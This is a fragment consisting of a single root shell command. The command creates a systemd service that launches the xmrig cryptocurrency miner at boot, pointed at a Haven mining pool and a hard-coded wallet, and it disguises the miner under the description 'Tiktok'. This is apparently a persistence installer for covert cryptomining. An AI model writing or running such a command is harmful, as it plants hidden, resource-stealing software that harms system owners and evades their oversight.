...
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/xmrig/xmrig --donate-level 1 -o haven.herominers.com:10451 -u hvs1Uv7rbUKP54rGnT62vu2KHBBGnN5B9Wcxn9gYtyK6GNqbvw7A8qMAa4zYuAarUXFygoznEUvRRgSD8dVHLHTB5Fp5hKubfi -p richVIP -a cn-heavy/xhv -k\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/haven.service'
